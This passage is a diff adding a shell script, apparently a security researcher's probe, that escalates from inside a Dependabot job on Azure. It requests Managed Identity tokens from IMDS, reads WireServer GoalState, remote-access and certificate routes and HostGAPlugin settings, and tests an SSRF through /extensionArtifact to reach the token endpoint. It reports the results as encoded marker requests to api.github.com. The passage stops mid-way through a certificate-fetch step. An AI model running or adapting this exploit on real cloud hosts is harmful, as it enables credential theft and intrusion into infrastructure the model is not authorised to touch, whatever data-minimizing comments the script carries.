@@ -1,0 +1,713 @@
+#!/bin/sh
+# Data-minimized Azure escalation probe for an owned Dependabot lab.
+# GET-only. It tests WireServer, HostGAPlugin and Azure IMDS, but never prints
+# response bodies, token values, SAS values, certificate values, private keys,
+# instance identifiers, or internal URLs. Every temporary artifact is deleted.
+set +e
+
+api_base="https://api.github.com"
+source_repo="fazemike1-lab/dbot-rce-source"
+tmp_dir="/tmp/dbot-wire-cert-$$"
+umask 077
+mkdir -p "$tmp_dir" || exit 1
+
+cleanup() {
+  rm -f "$tmp_dir"/* 2>/dev/null
+  rmdir "$tmp_dir" 2>/dev/null
+}
+trap cleanup EXIT HUP INT TERM
+
+emit_marker() {
+  marker="$1"
+  curl -ksS --max-time 5 -o /dev/null \
+    "$api_base/repos/$source_repo/contents/$marker" 2>/dev/null
+}
+
+# Prove that both internal hosts came from anonymous registry entries, not secrets.
+anon_summary="unknown 0 0 0"
+if [ -n "${DEPENDABOT_JOB_PATH:-}" ] && [ -r "$DEPENDABOT_JOB_PATH" ]; then
+  anon_summary="$(ruby -rjson -ruri -e '
+    begin
+      parsed = JSON.parse(File.binread(ARGV[0]))
+      job = parsed["job"] || parsed.dig("data", "attributes") || {}
+      entries = job["credentials-metadata"] || job["credentials_metadata"] || []
+      host_for = lambda do |entry|
+        value = entry["url"] || entry["registry"] || entry["index-url"] || entry["host"]
+        begin
+          value = "//#{value}" unless value.to_s.include?("://")
+          URI.parse(value.to_s).host
+        rescue StandardError
+          nil
+        end
+      end
+      wire = entries.select { |entry| host_for.call(entry) == "168.63.129.16" }
+      imds = entries.select { |entry| host_for.call(entry) == "169.254.169.254" }
+      matching = wire + imds
+      secret_keys = %w[token password auth-key key client-secret]
+      secret_count = matching.sum { |entry| secret_keys.count { |key| !entry[key].to_s.empty? && entry[key].to_s != ":" } }
+      experiments = job["experiments"] || {}
+      puts [experiments["proxy-egress-enforce"] == true ? 1 : 0, wire.length, imds.length, secret_count].join(" ")
+    rescue StandardError
+      puts "unknown 0 0 0"
+    end
+  ' "$DEPENDABOT_JOB_PATH" 2>/dev/null)"
+fi
+set -- ${anon_summary:-unknown 0 0 0}
+egress_enforce="$1"
+wire_registry_count="$2"
+imds_registry_count="$3"
+registry_secret_count="$4"
+printf 'DBOT_AZESC_POLICY EGRESS_ENFORCE=%s WIRE_REGISTRIES=%s IMDS_REGISTRIES=%s REGISTRY_SECRET_FIELDS=%s\n' \
+  "$egress_enforce" "$wire_registry_count" "$imds_registry_count" "$registry_secret_count" >&2
+emit_marker ".dbot-azesc-POLICY-e${egress_enforce}-w${wire_registry_count}-i${imds_registry_count}-s${registry_secret_count}"
+
+# Negative egress control.
+control_body="$tmp_dir/control.bin"
+control_code="$(curl -ksS --connect-timeout 2 --max-time 5 -o "$control_body" \
+  -w '%{http_code}' 'http://dbot-egress-control.invalid:2375/_ping' 2>/dev/null)"
+control_size="$(wc -c < "$control_body" 2>/dev/null | tr -d ' ')"
+printf 'DBOT_WIRECERT_CONTROL STATUS=%s SIZE=%s\n' "${control_code:-curl_error}" "${control_size:-0}" >&2
+emit_marker ".dbot-wirecert-CONTROL-s${control_code:-x}-n${control_size:-0}"
+rm -f "$control_body"
+
+# Azure IMDS instance metadata. The body is reduced to structural booleans and
+# deleted; subscription, VM, network and resource identifiers are never logged.
+imds_instance_body="$tmp_dir/imds-instance.json"
+imds_instance_code="$(curl -sS --connect-timeout 2 --max-time 8 --max-filesize 524288 \
+  -H 'Metadata:true' -o "$imds_instance_body" -w '%{http_code}' \
+  'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null)"
+imds_instance_size="$(wc -c < "$imds_instance_body" 2>/dev/null | tr -d ' ')"
+imds_instance_shape="$(ruby -rjson -e '
+  begin
+    doc = JSON.parse(File.binread(ARGV[0]))
+    compute = doc["compute"]
+    network = doc["network"]
+    compute_ok = compute.is_a?(Hash) ? 1 : 0
+    network_ok = network.is_a?(Hash) ? 1 : 0
+    subscription = compute.is_a?(Hash) && !compute["subscriptionId"].to_s.empty? ? 1 : 0
+    vm_id = compute.is_a?(Hash) && !compute["vmId"].to_s.empty? ? 1 : 0
+    resource_group = compute.is_a?(Hash) && !compute["resourceGroupName"].to_s.empty? ? 1 : 0
+    private_ip = 0
+    if network.is_a?(Hash)
+      interfaces = network["interface"]
+      if interfaces.is_a?(Array)
+        private_ip = interfaces.any? do |iface|
+          addresses = iface.dig("ipv4", "ipAddress") rescue nil
+          addresses.is_a?(Array) && addresses.any? { |a| !a["privateIpAddress"].to_s.empty? }
+        end ? 1 : 0
+      end
+    end
+    puts [1, compute_ok, network_ok, subscription, vm_id, resource_group, private_ip].join(" ")
+  rescue StandardError
+    puts "0 0 0 0 0 0 0"
+  end
+' "$imds_instance_body" 2>/dev/null)"
+set -- ${imds_instance_shape:-0 0 0 0 0 0 0}
+imds_instance_json="$1"
+imds_compute="$2"
+imds_network="$3"
+imds_subscription="$4"
+imds_vmid="$5"
+imds_resource_group="$6"
+imds_private_ip="$7"
+printf 'DBOT_AZESC_IMDS_INSTANCE STATUS=%s SIZE=%s JSON=%s COMPUTE=%s NETWORK=%s SUBSCRIPTION_ID=%s VM_ID=%s RESOURCE_GROUP=%s PRIVATE_IP=%s\n' \
+  "${imds_instance_code:-curl_error}" "${imds_instance_size:-0}" "$imds_instance_json" "$imds_compute" \
+  "$imds_network" "$imds_subscription" "$imds_vmid" "$imds_resource_group" "$imds_private_ip" >&2
+emit_marker ".dbot-azesc-IMDS-s${imds_instance_code:-x}-n${imds_instance_size:-0}-j${imds_instance_json}-c${imds_compute}-nw${imds_network}-sub${imds_subscription}-vm${imds_vmid}-rg${imds_resource_group}-ip${imds_private_ip}"
+rm -f "$imds_instance_body"
+
+# Minimal Managed Identity validation. A successful response is parsed only for
+# token shape, audience and lifetime. The token is never printed, decoded, used
+# in an Authorization header, or sent to any Azure control-plane endpoint.
+mi_body="$tmp_dir/managed-identity.json"
+mi_code="$(curl -sS --connect-timeout 2 --max-time 10 --max-filesize 262144 \
+  -H 'Metadata:true' -o "$mi_body" -w '%{http_code}' \
+  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' 2>/dev/null)"
+mi_size="$(wc -c < "$mi_body" 2>/dev/null | tr -d ' ')"
+mi_shape="$(ruby -rjson -rtime -e '
+  begin
+    doc = JSON.parse(File.binread(ARGV[0]))
+    token = doc["access_token"].to_s
+    token_present = token.empty? ? 0 : 1
+    bearer = doc["token_type"].to_s.casecmp("Bearer").zero? ? 1 : 0
+    audience = doc["resource"].to_s == "https://management.azure.com/" ? 1 : 0
+    jwt_shape = token.split(".").length == 3 ? 1 : 0
+    expiry = doc["expires_on"].to_s
+    expiry_gt_30m = 0
+    begin
+      expiry_time = expiry.match?(/\A\d+\z/) ? Time.at(expiry.to_i).utc : Time.parse(expiry).utc
+      expiry_gt_30m = expiry_time > Time.now.utc + 1800 ? 1 : 0
+    rescue StandardError
+      expiry_gt_30m = 0
+    end
+    error_present = doc["error"].to_s.empty? ? 0 : 1
+    puts [1, token_present, bearer, audience, jwt_shape, expiry_gt_30m, error_present].join(" ")
+  rescue StandardError
+    puts "0 0 0 0 0 0 0"
+  end
+' "$mi_body" 2>/dev/null)"
+set -- ${mi_shape:-0 0 0 0 0 0 0}
+mi_json="$1"
+mi_token_present="$2"
+mi_bearer="$3"
+mi_arm_audience="$4"
+mi_jwt_shape="$5"
+mi_expiry_gt30m="$6"
+mi_error="$7"
+printf 'DBOT_AZESC_MANAGED_IDENTITY STATUS=%s SIZE=%s JSON=%s TOKEN_PRESENT=%s BEARER=%s ARM_AUDIENCE=%s JWT_SHAPE=%s EXPIRY_GT_30M=%s ERROR_PRESENT=%s TOKEN_USED=0\n' \
+  "${mi_code:-curl_error}" "${mi_size:-0}" "$mi_json" "$mi_token_present" "$mi_bearer" \
+  "$mi_arm_audience" "$mi_jwt_shape" "$mi_expiry_gt30m" "$mi_error" >&2
+emit_marker ".dbot-azesc-MI-s${mi_code:-x}-n${mi_size:-0}-j${mi_json}-t${mi_token_present}-b${mi_bearer}-a${mi_arm_audience}-jwt${mi_jwt_shape}-e30m${mi_expiry_gt30m}-err${mi_error}-used0"
+rm -f "$mi_body"
+
+# Fetch GoalState and extract only the certificate URL into a permission-0600
+# temporary file. The URL itself is never logged.
+goal_body="$tmp_dir/goalstate.xml"
+goal_code="$(curl -ksS --connect-timeout 2 --max-time 8 --max-filesize 262144 \
+  -H 'Metadata:true' \
+  -H 'x-ms-version: 2012-11-30' \
+  -H 'x-ms-agent-name: DependabotBoundaryCanary' \
+  -o "$goal_body" -w '%{http_code}' \
+  'http://168.63.129.16/machine?comp=goalstate' 2>/dev/null)"
+goal_size="$(wc -c < "$goal_body" 2>/dev/null | tr -d ' ')"
+cert_url_file="$tmp_dir/cert-url"
+container_id_file="$tmp_dir/container-id"
+config_name_file="$tmp_dir/config-name"
+remote_access_url_file="$tmp_dir/remote-access-url"
+goal_shape="$(ruby -rrexml/document -e '
+  begin
+    doc = REXML::Document.new(File.binread(ARGV[0]))
+    element = REXML::XPath.first(doc, "//Certificates")
+    url = element&.text.to_s
+    container_id = REXML::XPath.first(doc, "//ContainerId")&.text.to_s
+    config_name = REXML::XPath.first(doc, "//ConfigName")&.text.to_s
+    remote_access_url = REXML::XPath.first(doc, "//RemoteAccessInfo")&.text.to_s
+    File.binwrite(ARGV[1], url) unless url.empty?
+    File.binwrite(ARGV[2], container_id) unless container_id.empty?
+    File.binwrite(ARGV[3], config_name) unless config_name.empty?
+    File.binwrite(ARGV[4], remote_access_url) unless remote_access_url.empty?
+    puts [url.empty? ? 0 : 1, REXML::XPath.match(doc, "//RoleInstance").length,
+          remote_access_url.empty? ? 0 : 1].join(" ")
+  rescue StandardError
+    puts "0 0 0"
+  end
+' "$goal_body" "$cert_url_file" "$container_id_file" "$config_name_file" "$remote_access_url_file" 2>/dev/null)"
+set -- ${goal_shape:-0 0 0}
+cert_url_present="$1"
+role_instance_count="$2"
+remote_access_url_present="$3"
+printf 'DBOT_WIRECERT_GOAL STATUS=%s SIZE=%s CERT_URL_PRESENT=%s ROLE_INSTANCE_COUNT=%s REMOTE_ACCESS_URL_PRESENT=%s\n' \
+  "${goal_code:-curl_error}" "${goal_size:-0}" "$cert_url_present" "$role_instance_count" "$remote_access_url_present" >&2
+emit_marker ".dbot-wirecert-GOAL-s${goal_code:-x}-n${goal_size:-0}-c${cert_url_present}-ri${role_instance_count}-ra${remote_access_url_present}"
+
+if [ "$goal_code" != "200" ] || [ "$cert_url_present" != "1" ] || [ ! -s "$cert_url_file" ]; then
+  exit 1
+fi
+
+# If Azure announces RemoteAccessInfo, fetch only that exact internal GET route
+# and reduce it to counts. Usernames and encrypted passwords are never logged or
+# decrypted, even though the guest certificate may be able to decrypt them.
+remote_access_code=not_announced
+remote_access_size=0
+remote_access_xml=0
+remote_access_users=0
+remote_access_passwords=0
+if [ "$remote_access_url_present" = "1" ] && [ -s "$remote_access_url_file" ]; then
+  remote_access_url="$(cat "$remote_access_url_file" 2>/dev/null)"
+  REMOTE_ACCESS_URL="$remote_access_url" ruby -ruri -e '
+    begin
+      uri = URI.parse(ENV.fetch("REMOTE_ACCESS_URL"))
+      valid = uri.scheme == "http" && uri.host == "168.63.129.16" && uri.port == 80 &&
+        uri.path.start_with?("/machine/") && uri.query.to_s.split("&").include?("comp=remoteaccess") &&
+        uri.userinfo.nil? && uri.fragment.nil?
+      exit(valid ? 0 : 1)
+    rescue StandardError
+      exit 1
+    end
+  ' >/dev/null 2>&1
+  if [ $? -eq 0 ]; then
+    remote_access_body="$tmp_dir/remote-access.xml"
+    remote_access_code="$(curl -ksS --connect-timeout 2 --max-time 8 --max-filesize 524288 \
+      -H 'Metadata:true' -H 'x-ms-version: 2012-11-30' \
+      -H 'x-ms-agent-name: DependabotBoundaryCanary' \
+      -o "$remote_access_body" -w '%{http_code}' "$remote_access_url" 2>/dev/null)"
+    remote_access_size="$(wc -c < "$remote_access_body" 2>/dev/null | tr -d ' ')"
+    remote_access_shape="$(ruby -rrexml/document -e '
+      begin
+        doc = REXML::Document.new(File.binread(ARGV[0]))
+        users = REXML::XPath.match(doc, "//User")
+        passwords = users.count { |u| !REXML::XPath.first(u, "Password")&.text.to_s.empty? }
+        puts [1, users.length, passwords].join(" ")
+      rescue StandardError
+        puts "0 0 0"
+      end
+    ' "$remote_access_body" 2>/dev/null)"
+    set -- ${remote_access_shape:-0 0 0}
+    remote_access_xml="$1"
+    remote_access_users="$2"
+    remote_access_passwords="$3"
+    rm -f "$remote_access_body"
+  else
+    remote_access_code=skipped_invalid_url
+  fi
+  unset remote_access_url REMOTE_ACCESS_URL
+fi
+printf 'DBOT_AZESC_REMOTE_ACCESS STATUS=%s SIZE=%s XML=%s USERS=%s ENCRYPTED_PASSWORDS=%s DECRYPTED=0\n' \
+  "$remote_access_code" "$remote_access_size" "$remote_access_xml" "$remote_access_users" "$remote_access_passwords" >&2
+emit_marker ".dbot-azesc-REMOTE-s${remote_access_code}-n${remote_access_size}-x${remote_access_xml}-u${remote_access_users}-p${remote_access_passwords}-d0"
+
+# Read-only HostGAPlugin check on the Azure-documented WireServer channel.
+# IDs required by the protocol remain in 0600 temp files and are never logged.
+# The response body is reduced to structural counts only, then deleted.
+host_versions_code=skipped
+host_versions_size=0
+vmsettings_code=skipped
+vmsettings_size=0
+vmsettings_json=0
+vmsettings_protected=0
+vmsettings_thumbprints=0
+status_sas_present=0
+status_sas_signature=0
+status_sas_write=0
+status_sas_gt24h=0
+status_url_https=0
+status_url_query=0
+status_query_params=0
+extension_goal_count=0
+if [ -s "$container_id_file" ] && [ -s "$config_name_file" ]; then
+  container_id="$(cat "$container_id_file" 2>/dev/null)"
+  config_name="$(cat "$config_name_file" 2>/dev/null)"
+  host_versions_body="$tmp_dir/host-versions.bin"
+  host_versions_code="$(curl -ksS --connect-timeout 2 --max-time 6 --max-filesize 262144 \
+    -H "x-ms-containerid: $container_id" \
+    -o "$host_versions_body" -w '%{http_code}' \
+    'http://168.63.129.16:32526/versions' 2>/dev/null)"
+  host_versions_size="$(wc -c < "$host_versions_body" 2>/dev/null | tr -d ' ')"
+
+  vmsettings_body="$tmp_dir/vmsettings.json"
+  vmsettings_code="$(curl -ksS --connect-timeout 2 --max-time 8 --max-filesize 1048576 \
+    -H 'x-ms-version: 2015-09-01' \
+    -H "x-ms-containerid: $container_id" \
+    -H "x-ms-host-config-name: $config_name" \
+    -H 'x-ms-client-correlationid: 00000000-0000-4000-8000-000000000001' \
+    -o "$vmsettings_body" -w '%{http_code}' \
+    'http://168.63.129.16:32526/vmSettings' 2>/dev/null)"
+  vmsettings_size="$(wc -c < "$vmsettings_body" 2>/dev/null | tr -d ' ')"
+  vmsettings_shape="$(ruby -rjson -ruri -rcgi -rtime -e '
+    begin
+      doc = JSON.parse(File.binread(ARGV[0]))
+      walk = lambda do |value, counts|
+        case value
+        when Hash
+          value.each do |key, child|
+            counts[0] += 1 if key == "protectedSettings" && !child.nil? && child.to_s != ""
+            counts[1] += 1 if key == "protectedSettingsCertThumbprint" && !child.nil? && child.to_s != ""
+            walk.call(child, counts)
+          end
+        when Array
+          value.each { |child| walk.call(child, counts) }
+        end
+      end
+      counts = [0, 0]
+      walk.call(doc, counts)
+      status = doc["statusUploadBlob"] || doc["StatusUploadBlob"]
+      status_value = status.is_a?(Hash) ? (status["value"] || status["Value"]).to_s : ""
+      sas_present = status_value.empty? ? 0 : 1
+      sig_present = 0
+      write_permission = 0
+      expiry_gt_24h = 0
+      value_https = status_value.start_with?("https://") ? 1 : 0
+      query_present = 0
+      query_count = 0
+      unless status_value.empty?
+        begin
+          uri = URI.parse(status_value)
+          query_present = uri.query.to_s.empty? ? 0 : 1
+          pairs = URI.decode_www_form(uri.query.to_s)
+          params = pairs.group_by { |key, _value| key.downcase }
+          query_count = pairs.length
+          sig_present = params.fetch("sig", []).any? { |_key, value| !value.empty? } ? 1 : 0
+          permissions = params.fetch("sp", []).map { |_key, value| value }.join
+          write_permission = permissions.include?("w") ? 1 : 0
+          expiry = params.fetch("se", []).map { |_key, value| value }.first
+          begin
+            expiry_gt_24h = (!expiry.to_s.empty? && Time.iso8601(expiry) > Time.now.utc + 86400) ? 1 : 0
+          rescue StandardError
+            expiry_gt_24h = 0
+          end
+        rescue StandardError
+          sig_present = 0
+          write_permission = 0
+          expiry_gt_24h = 0
+        end
+      end
+      extensions = doc["extensionGoalStates"] || doc["ExtensionGoalStates"]
+      extension_count = extensions.is_a?(Array) ? extensions.length : 0
+      puts [1, counts[0], counts[1], sas_present, sig_present, write_permission, expiry_gt_24h,
+            value_https, query_present, query_count, extension_count].join(" ")
+    rescue StandardError
+      puts "0 0 0 0 0 0 0 0 0 0 0"
+    end
+  ' "$vmsettings_body" 2>/dev/null)"
+  set -- ${vmsettings_shape:-0 0 0 0 0 0 0 0 0 0 0}
+  vmsettings_json="$1"
+  vmsettings_protected="$2"
+  vmsettings_thumbprints="$3"
+  status_sas_present="$4"
+  status_sas_signature="$5"
+  status_sas_write="$6"
+  status_sas_gt24h="$7"
+  status_url_https="$8"
+  status_url_query="$9"
+  shift 9
+  status_query_params="$1"
+  extension_goal_count="$2"
+
+  # Last GET-only escalation check: determine whether HostGAPlugin's
+  # /extensionArtifact endpoint can proxy an attacker-chosen location. First
+  # fetch a harmless file from the owned public fixture. Only if the proxy is
+  # confirmed do we ask it for Azure instance metadata and, only on a valid
+  # instance document, the Managed Identity token endpoint. Bodies are reduced
+  # to booleans and deleted. Any token is never printed, decoded, or used.
+  hgap_public_body="$tmp_dir/hgap-public.bin"
+  hgap_public_code="$(curl -ksS --connect-timeout 2 --max-time 10 --max-filesize 524288 \
+    -H 'x-ms-version: 2015-09-01' \
+    -H "x-ms-containerid: $container_id" \
+    -H "x-ms-host-config-name: $config_name" \
+    -H 'x-ms-artifact-manifest-location: https://raw.githubusercontent.com/fazemike1-lab/dbot-rce-source/72cfd319e44d1b2e5ef31e6b2dc86ad2edff733e/.gitmodules' \
+    -H 'x-ms-artifact-location: https://raw.githubusercontent.com/fazemike1-lab/dbot-rce-source/72cfd319e44d1b2e5ef31e6b2dc86ad2edff733e/.gitmodules' \
+    -o "$hgap_public_body" -w '%{http_code}' \
+    'http://168.63.129.16:32526/extensionArtifact' 2>/dev/null)"
+  hgap_public_size="$(wc -c < "$hgap_public_body" 2>/dev/null | tr -d ' ')"
+  hgap_public_owned=0
+  if grep -q 'public-fixture' "$hgap_public_body" 2>/dev/null; then
+    hgap_public_owned=1
+  fi
+  printf 'DBOT_AZESC_HGAP_PROXY_PUBLIC STATUS=%s SIZE=%s OWNED_MARKER=%s\n' \
+    "${hgap_public_code:-curl_error}" "${hgap_public_size:-0}" "$hgap_public_owned" >&2
+  emit_marker ".dbot-azesc-HGAPPUB-s${hgap_public_code:-x}-n${hgap_public_size:-0}-o${hgap_public_owned}"
+  rm -f "$hgap_public_body"
+
+  hgap_imds_code=skipped
+  hgap_imds_size=0
+  hgap_imds_json=0
+  hgap_imds_compute=0
+  hgap_imds_network=0
+  hgap_mi_code=skipped
+  hgap_mi_size=0
+  hgap_mi_json=0
+  hgap_mi_token=0
+  hgap_mi_bearer=0
+  hgap_mi_arm=0
+  hgap_mi_jwt=0
+  hgap_mi_gt30m=0
+  if [ "$hgap_public_code" = "200" ] && [ "$hgap_public_owned" = "1" ]; then
+    hgap_imds_body="$tmp_dir/hgap-imds.json"
+    hgap_imds_code="$(curl -ksS --connect-timeout 2 --max-time 10 --max-filesize 524288 \
+      -H 'x-ms-version: 2015-09-01' \
+      -H "x-ms-containerid: $container_id" \
+      -H "x-ms-host-config-name: $config_name" \
+      -H 'x-ms-artifact-manifest-location: https://raw.githubusercontent.com/fazemike1-lab/dbot-rce-source/72cfd319e44d1b2e5ef31e6b2dc86ad2edff733e/.gitmodules' \
+      -H 'x-ms-artifact-location: http://169.254.169.254/metadata/instance?api-version=2021-02-01' \
+      -o "$hgap_imds_body" -w '%{http_code}' \
+      'http://168.63.129.16:32526/extensionArtifact' 2>/dev/null)"
+    hgap_imds_size="$(wc -c < "$hgap_imds_body" 2>/dev/null | tr -d ' ')"
+    hgap_imds_shape="$(ruby -rjson -e '
+      begin
+        doc = JSON.parse(File.binread(ARGV[0]))
+        puts [1, doc["compute"].is_a?(Hash) ? 1 : 0, doc["network"].is_a?(Hash) ? 1 : 0].join(" ")
+      rescue StandardError
+        puts "0 0 0"
+      end
+    ' "$hgap_imds_body" 2>/dev/null)"
+    set -- ${hgap_imds_shape:-0 0 0}
+    hgap_imds_json="$1"
+    hgap_imds_compute="$2"
+    hgap_imds_network="$3"
+    rm -f "$hgap_imds_body"
+
+    if [ "$hgap_imds_code" = "200" ] && [ "$hgap_imds_compute" = "1" ]; then
+      hgap_mi_body="$tmp_dir/hgap-mi.json"
+      hgap_mi_code="$(curl -ksS --connect-timeout 2 --max-time 10 --max-filesize 262144 \
+        -H 'x-ms-version: 2015-09-01' \
+        -H "x-ms-containerid: $container_id" \
+        -H "x-ms-host-config-name: $config_name" \
+        -H 'x-ms-artifact-manifest-location: https://raw.githubusercontent.com/fazemike1-lab/dbot-rce-source/72cfd319e44d1b2e5ef31e6b2dc86ad2edff733e/.gitmodules' \
+        -H 'x-ms-artifact-location: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' \
+        -o "$hgap_mi_body" -w '%{http_code}' \
+        'http://168.63.129.16:32526/extensionArtifact' 2>/dev/null)"
+      hgap_mi_size="$(wc -c < "$hgap_mi_body" 2>/dev/null | tr -d ' ')"
+      hgap_mi_shape="$(ruby -rjson -rtime -e '
+        begin
+          doc = JSON.parse(File.binread(ARGV[0]))
+          token = doc["access_token"].to_s
+          expiry = doc["expires_on"].to_s
+          gt30m = 0
+          begin
+            t = expiry.match?(/\A\d+\z/) ? Time.at(expiry.to_i).utc : Time.parse(expiry).utc
+            gt30m = t > Time.now.utc + 1800 ? 1 : 0
+          rescue StandardError
+            gt30m = 0
+          end
+          puts [1, token.empty? ? 0 : 1, doc["token_type"].to_s.casecmp("Bearer").zero? ? 1 : 0,
+                doc["resource"].to_s == "https://management.azure.com/" ? 1 : 0,
+                token.split(".").length == 3 ? 1 : 0, gt30m].join(" ")
+        rescue StandardError
+          puts "0 0 0 0 0 0"
+        end
+      ' "$hgap_mi_body" 2>/dev/null)"
+      set -- ${hgap_mi_shape:-0 0 0 0 0 0}
+      hgap_mi_json="$1"
+      hgap_mi_token="$2"
+      hgap_mi_bearer="$3"
+      hgap_mi_arm="$4"
+      hgap_mi_jwt="$5"
+      hgap_mi_gt30m="$6"
+      rm -f "$hgap_mi_body"
+    fi
+  fi
+  printf 'DBOT_AZESC_HGAP_IMDS STATUS=%s SIZE=%s JSON=%s COMPUTE=%s NETWORK=%s\n' \
+    "$hgap_imds_code" "$hgap_imds_size" "$hgap_imds_json" "$hgap_imds_compute" "$hgap_imds_network" >&2
+  emit_marker ".dbot-azesc-HGAPIMDS-s${hgap_imds_code}-n${hgap_imds_size}-j${hgap_imds_json}-c${hgap_imds_compute}-nw${hgap_imds_network}"
+  printf 'DBOT_AZESC_HGAP_MI STATUS=%s SIZE=%s JSON=%s TOKEN_PRESENT=%s BEARER=%s ARM_AUDIENCE=%s JWT_SHAPE=%s EXPIRY_GT_30M=%s TOKEN_USED=0\n' \
+    "$hgap_mi_code" "$hgap_mi_size" "$hgap_mi_json" "$hgap_mi_token" "$hgap_mi_bearer" \
+    "$hgap_mi_arm" "$hgap_mi_jwt" "$hgap_mi_gt30m" >&2
+  emit_marker ".dbot-azesc-HGAPMI-s${hgap_mi_code}-n${hgap_mi_size}-j${hgap_mi_json}-t${hgap_mi_token}-b${hgap_mi_bearer}-a${hgap_mi_arm}-jwt${hgap_mi_jwt}-e30m${hgap_mi_gt30m}-used0"
+  unset container_id config_name
+fi
+printf 'DBOT_WIRECERT_HOSTPLUGIN VERSIONS_STATUS=%s VERSIONS_SIZE=%s VMSETTINGS_STATUS=%s VMSETTINGS_SIZE=%s JSON=%s PROTECTED_SETTINGS=%s CERT_THUMBPRINTS=%s\n' \
+  "$host_versions_code" "${host_versions_size:-0}" "$vmsettings_code" "${vmsettings_size:-0}" \
+  "$vmsettings_json" "$vmsettings_protected" "$vmsettings_thumbprints" >&2
+emit_marker ".dbot-wirecert-HOST-vs${host_versions_code}-vn${host_versions_size:-0}-ms${vmsettings_code}-mn${vmsettings_size:-0}-j${vmsettings_json}-ps${vmsettings_protected}-ct${vmsettings_thumbprints}"
+printf 'DBOT_WIRECERT_STATUS_SAS PRESENT=%s HTTPS=%s QUERY=%s PARAMS=%s SIGNATURE=%s WRITE=%s EXPIRY_GT_24H=%s EXTENSION_GOALS=%s\n' \
+  "$status_sas_present" "$status_url_https" "$status_url_query" "$status_query_params" \
+  "$status_sas_signature" "$status_sas_write" "$status_sas_gt24h" "$extension_goal_count" >&2
+emit_marker ".dbot-wirecert-SAS-p${status_sas_present}-https${status_url_https}-q${status_url_query}-n${status_query_params}-sig${status_sas_signature}-w${status_sas_write}-gt24h${status_sas_gt24h}-eg${extension_goal_count}"
+
+# Characterize the SAS entirely offline. This establishes its documented
+# authority and portability without issuing any request to Azure Storage.
+sas_scope="$(ruby -rjson -ruri -rtime -e '
+  begin
+    doc = JSON.parse(File.binread(ARGV[0]))
+    status = doc["statusUploadBlob"] || doc["StatusUploadBlob"] || {}
+    value = status["value"] || status["Value"] || ""
+    uri = URI.parse(value)
+    pairs = URI.decode_www_form(uri.query.to_s)
+    params = pairs.group_by { |key, _value| key.downcase }
+    first = lambda { |key| params.fetch(key, []).map { |_k, v| v }.first.to_s }
+    permissions = first.call("sp")
+    expiry = first.call("se")
+    expiry_time = Time.iso8601(expiry)
+    storage_host = !uri.host.to_s.empty? ? 1 : 0
+    resource_blob = first.call("sr") == "b" ? 1 : 0
+    no_ip_restriction = first.call("sip").empty? ? 1 : 0
+    https_only = first.call("spr").split(",").include?("https") ? 1 : 0
+    expiry_gt_7d = expiry_time > Time.now.utc + (7 * 86400) ? 1 : 0
+    expiry_gt_30d = expiry_time > Time.now.utc + (30 * 86400) ? 1 : 0
+    stored_policy = first.call("si").empty? ? 0 : 1
+    path_segments = uri.path.split("/").reject(&:empty?).length
+    read_permission = permissions.include?("r") ? 1 : 0
+    create_permission = permissions.include?("c") ? 1 : 0
+    delete_permission = permissions.include?("d") ? 1 : 0
+    add_permission = permissions.include?("a") ? 1 : 0
+    start_absent = first.call("st").empty? ? 1 : 0
+    puts [storage_host, resource_blob, no_ip_restriction, https_only, expiry_gt_7d,
+          expiry_gt_30d, stored_policy, path_segments, read_permission, create_permission,
+          delete_permission, add_permission, start_absent].join(" ")
+  rescue StandardError
+    puts "0 0 0 0 0 0 0 0 0 0 0 0 0"
+  end
+' "$vmsettings_body" 2>/dev/null)"
+set -- ${sas_scope:-0 0 0 0 0 0 0 0 0 0 0 0 0}
+sas_storage_host="$1"
+sas_resource_blob="$2"
+sas_no_ip_restriction="$3"
+sas_https_only="$4"
+sas_expiry_gt7d="$5"
+sas_expiry_gt30d="$6"
+sas_stored_policy="$7"
+sas_path_segments="$8"
+sas_read="$9"
+shift 9
+sas_create="$1"
+sas_delete="$2"
+sas_add="$3"
+sas_start_absent="$4"
+printf 'DBOT_AZESC_SAS_SCOPE HOST_PRESENT=%s RESOURCE_BLOB=%s NO_IP_RESTRICTION=%s HTTPS_ONLY=%s EXPIRY_GT_7D=%s EXPIRY_GT_30D=%s STORED_POLICY=%s PATH_SEGMENTS=%s READ=%s CREATE=%s DELETE=%s ADD=%s START_ABSENT=%s SAS_USED=0\n' \
+  "$sas_storage_host" "$sas_resource_blob" "$sas_no_ip_restriction" "$sas_https_only" \
+  "$sas_expiry_gt7d" "$sas_expiry_gt30d" "$sas_stored_policy" "$sas_path_segments" \
+  "$sas_read" "$sas_create" "$sas_delete" "$sas_add" "$sas_start_absent" >&2
+emit_marker ".dbot-azesc-SASSCOPE-h${sas_storage_host}-rb${sas_resource_blob}-nip${sas_no_ip_restriction}-https${sas_https_only}-e7d${sas_expiry_gt7d}-e30d${sas_expiry_gt30d}-si${sas_stored_policy}-ps${sas_path_segments}-r${sas_read}-c${sas_create}-d${sas_delete}-a${sas_add}-st0${sas_start_absent}-used0"
+
+# Accept only the exact read-only WireServer certificates route announced by
+# this GoalState. No redirects and no state-changing methods are used.
+cert_url="$(cat "$cert_url_file" 2>/dev/null)"
+WIRE_CERT_URL="$cert_url" ruby -ruri -e '
+  begin
+    uri = URI.parse(ENV.fetch("WIRE_CERT_URL"))
+    valid = uri.scheme == "http" && uri.host == "168.63.129.16" && uri.port == 80 &&
+      uri.path.start_with?("/machine/") && uri.query.to_s.split("&").include?("comp=certificates") &&
+      uri.userinfo.nil? && uri.fragment.nil?
+    exit(valid ? 0 : 1)
+  rescue StandardError
+    exit 1
+  end
+' >/dev/null 2>&1
+if [ $? -ne 0 ]; then
+  printf 'DBOT_WIRECERT_CERTS STATUS=skipped_invalid_internal_url SIZE=0 FORMAT_OK=0 DATA_PRESENT=0\n' >&2
+  emit_marker '.dbot-wirecert-CERTS-SKIPPED'
+  exit 1
+fi
+
+# Follow the official WALinuxAgent transport-certificate flow: generate an
+# ephemeral keypair and send only its public certificate in the request header.
+transport_key="$tmp_dir/transport.key"
+transport_crt="$tmp_dir/transport.crt"
+openssl req -x509 -nodes -subj '/CN=LinuxTransport' -days 1 -newkey rsa:2048 \
+  -keyout "$transport_key" -out "$transport_crt" >/dev/null 2>&1
+keygen_rc=$?
